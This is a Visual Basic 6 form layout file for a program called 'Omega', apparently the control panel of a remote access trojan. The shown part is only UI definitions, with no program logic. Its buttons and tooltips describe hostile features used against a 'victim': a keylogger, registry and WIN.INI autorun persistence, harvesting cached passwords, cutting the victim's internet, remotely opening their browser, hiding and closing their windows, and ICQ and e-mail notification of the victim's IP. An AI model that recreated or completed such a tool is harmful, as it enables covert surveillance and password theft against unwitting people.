VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Object = "{6B7E6392-850A-101B-AFC0-4210102A8DA7}#1.3#0"; "COMCTL32.OCX"
Object = "{0D452EE1-E08F-101A-852E-02608C4D0BB4}#2.0#0"; "FM20.DLL"
Begin VB.Form frmMain 
   Caption         =   "Omega"
   ClientHeight    =   7290
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   9480
   BeginProperty Font 
      Name            =   "Tahoma"
      Size            =   8.25
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   7290
   ScaleWidth      =   9480
   StartUpPosition =   2  'CenterScreen
   Begin VB.PictureBox picfunc 
      Appearance      =   0  'Flat
      BackColor       =   &H80000010&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   4065
      Index           =   12
      Left            =   3240
      ScaleHeight     =   4035
      ScaleWidth      =   4035
      TabIndex        =   17
      Top             =   1710
      Width           =   4065
      Begin VB.CommandButton ImgIcon_12 
         Height          =   645
         Index           =   3
         Left            =   3210
         Picture         =   "frmMain.frx":0FC2
         Style           =   1  'Graphical
         TabIndex        =   351
         ToolTipText     =   "Icon question"
         Top             =   630
         Width           =   630
      End
      Begin VB.CommandButton ImgIcon_12 
         Height          =   645
         Index           =   2
         Left            =   2490
         Picture         =   "frmMain.frx":1404
         Style           =   1  'Graphical
         TabIndex        =   350
         ToolTipText     =   "Icon error"
         Top             =   630
         Width           =   630
      End
      Begin VB.CommandButton ImgIcon_12 
         Height          =   645
         Index           =   1
         Left            =   1770
         Picture         =   "frmMain.frx":1846
         Style           =   1  'Graphical
         TabIndex        =   349
         ToolTipText     =   "Icon information"
         Top             =   630
         Width           =   630
      End
      Begin VB.CommandButton ImgIcon_12 
         Height          =   645
         Index           =   0
         Left            =   1050
         Picture         =   "frmMain.frx":1C88
         Style           =   1  'Graphical
         TabIndex        =   348
         ToolTipText     =   "Icon warning"
         Top             =   630
         Width           =   630
      End
      Begin VB.TextBox txtMsg_12 
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   120
         TabIndex        =   109
         Top             =   3600
         Visible         =   0   'False
         Width           =   405
      End
      Begin VB.CommandButton cmdTestMsg_12 
         Caption         =   "Test Message"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   600
         Style           =   1  'Graphical
         TabIndex        =   94
         ToolTipText     =   "Test message on local"
         Top             =   3600
         Width           =   1400
      End
      Begin VB.CommandButton cmdSendMsg_12 
         Caption         =   "Send Message"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   2100
         Style           =   1  'Graphical
         TabIndex        =   93
         ToolTipText     =   "Send message"
         Top             =   3600
         Width           =   1400
      End
      Begin VB.TextBox txtMsgText_12 
         Height          =   255
         Left            =   1200
         TabIndex        =   91
         ToolTipText     =   "Message text"
         Top             =   2910
         Width           =   2655
      End
      Begin VB.TextBox txtMsgTitle_12 
         Height          =   255
         Left            =   1200
         TabIndex        =   89
         ToolTipText     =   "Message title"
         Top             =   2550
         Width           =   2655
      End
      Begin VB.PictureBox Picture1 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   615
         Left            =   210
         ScaleHeight     =   585
         ScaleWidth      =   585
         TabIndex        =   87
         Top             =   630
         Width           =   615
         Begin VB.Label lblIcon_12 
            BackStyle       =   0  'Transparent
            Caption         =   "None"
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   165
            Left            =   90
            TabIndex        =   88
            Top             =   180
            Width           =   435
         End
         Begin VB.Image Icon_12 
            Height          =   480
            Left            =   60
            Top             =   60
            Width           =   480
         End
      End
      Begin VB.OptionButton OptButton_12 
         Appearance      =   0  'Flat
         BackColor       =   &H80000010&
         Caption         =   "Yes, No, Cancel"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   5
         Left            =   2310
         MaskColor       =   &H00FFFFFF&
         TabIndex        =   85
         Top             =   2190
         Width           =   1455
      End
      Begin VB.OptionButton OptButton_12 
         Appearance      =   0  'Flat
         BackColor       =   &H80000010&
         Caption         =   "Yes, No"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   4
         Left            =   2310
         MaskColor       =   &H00FFFFFF&
         TabIndex        =   84
         Top             =   1920
         Width           =   885
      End
      Begin VB.OptionButton OptButton_12 
         Appearance      =   0  'Flat
         BackColor       =   &H80000010&
         Caption         =   "Retry, Cancel"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   3
         Left            =   2310
         MaskColor       =   &H00FFFFFF&
         TabIndex        =   83
         Top             =   1650
         Width           =   1335
      End
      Begin VB.OptionButton OptButton_12 
         Appearance      =   0  'Flat
         BackColor       =   &H80000010&
         Caption         =   "OK, Cancel"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   2
         Left            =   300
         MaskColor       =   &H00FFFFFF&
         TabIndex        =   82
         Top             =   2160
         Width           =   1125
      End
      Begin VB.OptionButton OptButton_12 
         Appearance      =   0  'Flat
         BackColor       =   &H80000010&
         Caption         =   "Abort, Retry, Ignore"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   1
         Left            =   300
         MaskColor       =   &H00FFFFFF&
         TabIndex        =   81
         Top             =   1890
         Width           =   1815
      End
      Begin VB.OptionButton OptButton_12 
         Appearance      =   0  'Flat
         BackColor       =   &H80000010&
         Caption         =   "OK"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   0
         Left            =   300
         MaskColor       =   &H00FFFFFF&
         TabIndex        =   80
         Top             =   1620
         Width           =   525
      End
      Begin VB.Label Label87 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Msg Icon"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   195
         TabIndex        =   329
         Top             =   360
         Width           =   645
      End
      Begin VB.Label Label5 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Buttons"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   200
         TabIndex        =   328
         Top             =   1350
         Width           =   555
      End
      Begin VB.Image ImgNone_12 
         Height          =   480
         Left            =   30
         Top             =   30
         Visible         =   0   'False
         Width           =   480
      End
      Begin VB.Label Label21 
         BackStyle       =   0  'Transparent
         Caption         =   "*Note: use ""\n"" for <ENTER> in the message text"
         ForeColor       =   &H80000008&
         Height          =   225
         Left            =   210
         TabIndex        =   95
         Top             =   3270
         Width           =   3675
      End
      Begin VB.Label Label20 
         BackStyle       =   0  'Transparent
         Caption         =   "Message Text:"
         ForeColor       =   &H80000008&
         Height          =   225
         Left            =   90
         TabIndex        =   92
         Top             =   2940
         Width           =   1125
      End
      Begin VB.Label Label19 
         BackStyle       =   0  'Transparent
         Caption         =   "Message Title:"
         ForeColor       =   &H80000008&
         Height          =   225
         Left            =   120
         TabIndex        =   90
         Top             =   2580
         Width           =   1125
      End
      Begin VB.Label Label17 
         BackStyle       =   0  'Transparent
         Caption         =   "Warning      Info         Error    Question"
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   1050
         TabIndex        =   86
         Top             =   360
         Width           =   2805
      End
      Begin VB.Label Label4 
         BackStyle       =   0  'Transparent
         Caption         =   "Msg Manager                                                              "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   120
         TabIndex        =   79
         Top             =   90
         Width           =   3800
      End
   End
   Begin VB.PictureBox picfunc 
      Appearance      =   0  'Flat
      BackColor       =   &H80000010&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   4065
      Index           =   3
      Left            =   2160
      ScaleHeight     =   4035
      ScaleWidth      =   4035
      TabIndex        =   8
      Top             =   1170
      Width           =   4065
      Begin VB.OptionButton OptAutorun_3 
         BackColor       =   &H80000010&
         Caption         =   "Registry-Run"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   1
         Left            =   150
         TabIndex        =   362
         Top             =   2430
         Width           =   1305
      End
      Begin VB.OptionButton OptAutorun_3 
         BackColor       =   &H80000010&
         Caption         =   "WIN.INI"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   0
         Left            =   150
         TabIndex        =   361
         Top             =   2130
         Width           =   915
      End
      Begin VB.OptionButton OptAutorun_3 
         BackColor       =   &H80000010&
         Caption         =   "Registry-RunServices"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   2
         Left            =   150
         TabIndex        =   360
         Top             =   2730
         Width           =   1905
      End
      Begin VB.CommandButton cmdKeyLogger_3 
         Caption         =   "Disable"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   1
         Left            =   2560
         Style           =   1  'Graphical
         TabIndex        =   327
         ToolTipText     =   "Disable keylogger"
         Top             =   1410
         Width           =   1350
      End
      Begin VB.CommandButton cmdKeyLogger_3 
         Caption         =   "Enable"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   0
         Left            =   1110
         Style           =   1  'Graphical
         TabIndex        =   326
         ToolTipText     =   "Enable keylogger"
         Top             =   1410
         Width           =   1350
      End
      Begin VB.CommandButton cmdChangeAutorun_3 
         Caption         =   "Change"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   2070
         Style           =   1  'Graphical
         TabIndex        =   113
         ToolTipText     =   "Change startup method"
         Top             =   2670
         Width           =   1760
      End
      Begin VB.CommandButton cmdCloseServ_3 
         Caption         =   "Close Server"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   2070
         Style           =   1  'Graphical
         TabIndex        =   108
         ToolTipText     =   "Close server"
         Top             =   3570
         Width           =   1760
      End
      Begin VB.CommandButton cmdRemoveServ_3 
         Caption         =   "Remove Server"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   210
         Style           =   1  'Graphical
         TabIndex        =   107
         ToolTipText     =   "Remove server"
         Top             =   3570
         Width           =   1760
      End
      Begin VB.CommandButton cmdDisconnVic_3 
         Caption         =   "Disconnect Victim"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   210
         Style           =   1  'Graphical
         TabIndex        =   106
         ToolTipText     =   "Disconnect victim internet connection"
         Top             =   3120
         Width           =   1760
      End
      Begin VB.CommandButton cmdRestartServ_3 
         Caption         =   "Restart Server"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   2070
         Style           =   1  'Graphical
         TabIndex        =   105
         ToolTipText     =   "Restart server"
         Top             =   3120
         Width           =   1760
      End
      Begin VB.CommandButton cmdSetPass_3 
         Caption         =   "Set"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   2160
         Style           =   1  'Graphical
         TabIndex        =   104
         ToolTipText     =   "Set password protected"
         Top             =   840
         Width           =   850
      End
      Begin VB.CommandButton cmdRemovePass_3 
         Caption         =   "Remove"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   3060
         Style           =   1  'Graphical
         TabIndex        =   103
         ToolTipText     =   "Remove pasword protected"
         Top             =   840
         Width           =   850
      End
      Begin VB.TextBox txtSetPass_3 
         Height          =   285
         Left            =   3060
         MaxLength       =   8
         TabIndex        =   101
         Top             =   420
         Width           =   830
      End
      Begin VB.CommandButton cmdChangePort_3 
         Caption         =   "Change"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   120
         Style           =   1  'Graphical
         TabIndex        =   100
         ToolTipText     =   "Change port number"
         Top             =   840
         Width           =   850
      End
      Begin VB.CommandButton cmdDefaultPort_3 
         Caption         =   "Default"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   1020
         Style           =   1  'Graphical
         TabIndex        =   99
         ToolTipText     =   "Set default port number 54896"
         Top             =   840
         Width           =   850
      End
      Begin VB.TextBox txtPort_3 
         Height          =   285
         Left            =   1200
         MaxLength       =   5
         TabIndex        =   96
         Top             =   420
         Width           =   645
      End
      Begin VB.Label Label86 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "KeyLogger:"
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   180
         TabIndex        =   325
         Top             =   1440
         Width           =   825
      End
      Begin VB.Label Label26 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Startup Method"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   150
         TabIndex        =   112
         Top             =   1860
         Width           =   1125
      End
      Begin VB.Label Label24 
         BackStyle       =   0  'Transparent
         Caption         =   "Set Password:"
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   1980
         TabIndex        =   102
         Top             =   450
         Width           =   1065
      End
      Begin VB.Label Label23 
         BackStyle       =   0  'Transparent
         Caption         =   "Change Port:"
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   180
         TabIndex        =   98
         Top             =   450
         Width           =   975
      End
      Begin VB.Label Label22 
         BackStyle       =   0  'Transparent
         Caption         =   "Server Option                                                          "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   255
         Left            =   120
         TabIndex        =   97
         Top             =   90
         Width           =   3800
      End
   End
   Begin VB.PictureBox picfunc 
      Appearance      =   0  'Flat
      BackColor       =   &H80000010&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   4065
      Index           =   2
      Left            =   2040
      ScaleHeight     =   4035
      ScaleWidth      =   4035
      TabIndex        =   7
      Top             =   1110
      Width           =   4065
      Begin VB.CommandButton cmdHelp_2 
         Caption         =   "?"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   180
         TabIndex        =   359
         Top             =   3570
         Width           =   435
      End
      Begin VB.ListBox ListPass_2 
         Height          =   1230
         Index           =   1
         Left            =   120
         TabIndex        =   356
         Top             =   2130
         Width           =   3735
      End
      Begin VB.ListBox ListPass_2 
         Height          =   1230
         Index           =   0
         Left            =   120
         TabIndex        =   355
         Top             =   570
         Width           =   3735
      End
      Begin VB.CommandButton cmdGetCPass_2 
         Caption         =   "Get Cache Passwords"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   990
         Style           =   1  'Graphical
         TabIndex        =   115
         ToolTipText     =   "Get cache passwords"
         Top             =   3570
         Width           =   2200
      End
      Begin VB.Label Label29 
         BackStyle       =   0  'Transparent
         Caption         =   "Password:"
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   150
         TabIndex        =   117
         Top             =   1920
         Width           =   885
      End
      Begin VB.Label Label28 
         BackStyle       =   0  'Transparent
         Caption         =   "Resource:"
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   150
         TabIndex        =   116
         Top             =   360
         Width           =   855
      End
      Begin VB.Label Label27 
         BackStyle       =   0  'Transparent
         Caption         =   "Passwords                                                                "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   120
         TabIndex        =   114
         Top             =   90
         Width           =   3800
      End
   End
   Begin VB.PictureBox picfunc 
      Appearance      =   0  'Flat
      BackColor       =   &H80000010&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   4065
      Index           =   14
      Left            =   3480
      ScaleHeight     =   4035
      ScaleWidth      =   4035
      TabIndex        =   19
      Top             =   1830
      Width           =   4065
      Begin MSComctlLib.ListView ListView_14 
         Height          =   2355
         Left            =   120
         TabIndex        =   358
         Top             =   360
         Width           =   3795
         _ExtentX        =   6694
         _ExtentY        =   4154
         View            =   3
         LabelEdit       =   1
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         AllowReorder    =   -1  'True
         FullRowSelect   =   -1  'True
         GridLines       =   -1  'True
         _Version        =   393217
         ForeColor       =   -2147483640
         BackColor       =   -2147483643
         BorderStyle     =   1
         Appearance      =   1
         NumItems        =   2
         BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            Text            =   "Window Name"
            Object.Width           =   4939
         EndProperty
         BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   1
            Text            =   "Handle"
            Object.Width           =   1182
         EndProperty
      End
      Begin VB.TextBox txtRename_14 
         Height          =   285
         Left            =   1080
         TabIndex        =   142
         ToolTipText     =   "Window name"
         Top             =   2820
         Width           =   1845
      End
      Begin VB.CommandButton cmdRename_14 
         Caption         =   "Rename"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   3000
         Style           =   1  'Graphical
         TabIndex        =   141
         ToolTipText     =   "Rename window title"
         Top             =   2820
         Width           =   910
      End
      Begin VB.CommandButton cmdDisableX_14 
         Caption         =   "Disable X"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   3000
         Style           =   1  'Graphical
         TabIndex        =   140
         ToolTipText     =   "Disable X button"
         Top             =   3600
         Width           =   910
      End
      Begin VB.CommandButton cmdFocus_14 
         Caption         =   "Focus"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   2040
         Style           =   1  'Graphical
         TabIndex        =   139
         ToolTipText     =   "Focus window"
         Top             =   3600
         Width           =   910
      End
      Begin VB.CommandButton cmdMax_14 
         Caption         =   "Max"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   1080
         Style           =   1  'Graphical
         TabIndex        =   138
         ToolTipText     =   "Maximize window"
         Top             =   3600
         Width           =   910
      End
      Begin VB.CommandButton cmdMin_14 
         Caption         =   "Min"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   120
         Style           =   1  'Graphical
         TabIndex        =   137
         ToolTipText     =   "Minimize window"
         Top             =   3600
         Width           =   910
      End
      Begin VB.CommandButton cmdClose_14 
         Caption         =   "Close"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   3000
         Style           =   1  'Graphical
         TabIndex        =   136
         ToolTipText     =   "Close window"
         Top             =   3210
         Width           =   910
      End
      Begin VB.CommandButton cmdShow_14 
         Caption         =   "Show"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   2040
         Style           =   1  'Graphical
         TabIndex        =   135
         ToolTipText     =   "Show window"
         Top             =   3210
         Width           =   910
      End
      Begin VB.CommandButton cmdHide_14 
         Caption         =   "Hide"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   1080
         Style           =   1  'Graphical
         TabIndex        =   134
         ToolTipText     =   "Hide window"
         Top             =   3210
         Width           =   910
      End
      Begin VB.CommandButton cmdRefresh_14 
         Caption         =   "Refresh"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   120
         Style           =   1  'Graphical
         TabIndex        =   133
         ToolTipText     =   "Refresh window list"
         Top             =   3210
         Width           =   910
      End
      Begin VB.Label Label36 
         BackStyle       =   0  'Transparent
         Caption         =   "Windows:"
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   300
         TabIndex        =   143
         Top             =   2850
         Width           =   765
      End
      Begin VB.Label Label35 
         BackStyle       =   0  'Transparent
         Caption         =   "Windows Manager                                                  "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   225
         Left            =   120
         TabIndex        =   132
         Top             =   90
         Width           =   3800
      End
   End
   Begin VB.PictureBox picfunc 
      Appearance      =   0  'Flat
      BackColor       =   &H80000010&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   4065
      Index           =   8
      Left            =   2760
      ScaleHeight     =   4035
      ScaleWidth      =   4035
      TabIndex        =   13
      Top             =   1470
      Width           =   4065
      Begin VB.CommandButton cmdOpen_8 
         Caption         =   "Open Browser"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   1290
         Style           =   1  'Graphical
         TabIndex        =   158
         ToolTipText     =   "Open victim browser goto you especify URL"
         Top             =   2310
         Width           =   1430
      End
      Begin VB.TextBox txtURL_8 
         Height          =   285
         Left            =   120
         TabIndex        =   156
         Text            =   "http://"
         Top             =   1830
         Width           =   3765
      End
      Begin VB.Label Label41 
         BackStyle       =   0  'Transparent
         Caption         =   "Browser                                                                      "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   225
         Left            =   120
         TabIndex        =   159
         Top             =   90
         Width           =   3800
      End
      Begin VB.Label Label40 
         BackStyle       =   0  'Transparent
         Caption         =   "URL:"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   150
         TabIndex        =   157
         Top             =   1560
         Width           =   405
      End
   End
   Begin VB.PictureBox picfunc 
      Appearance      =   0  'Flat
      BackColor       =   &H80000010&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   4065
      Index           =   4
      Left            =   2280
      ScaleHeight     =   4035
      ScaleWidth      =   4035
      TabIndex        =   9
      Top             =   1230
      Width           =   4065
      Begin VB.TextBox txtUIN_4 
         Height          =   285
         Left            =   1350
         MaxLength       =   15
         TabIndex        =   313
         ToolTipText     =   "Your ICQ number"
         Top             =   2850
         Width           =   2385
      End
      Begin VB.CommandButton cmdIPNotify_4 
         Caption         =   "Enable"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   2
         Left            =   1365
         Style           =   1  'Graphical
         TabIndex        =   312
         ToolTipText     =   "Enable ICQ notify"
         Top             =   3330
         Width           =   1000
      End
      Begin VB.CommandButton cmdIPNotify_4 
         Caption         =   "Disable"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   3
         Left            =   2745
         Style           =   1  'Graphical
         TabIndex        =   311
         ToolTipText     =   "Disable ICQ notify"
         Top             =   3330
         Width           =   1000
      End
      Begin VB.CommandButton cmdIPNotify_4 
         Caption         =   "Disable"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   1
         Left            =   2745
         Style           =   1  'Graphical
         TabIndex        =   125
         ToolTipText     =   "Disable e-mail notify"
         Top             =   1710
         Width           =   1000
      End
      Begin VB.CommandButton cmdIPNotify_4 
         Caption         =   "Enable"
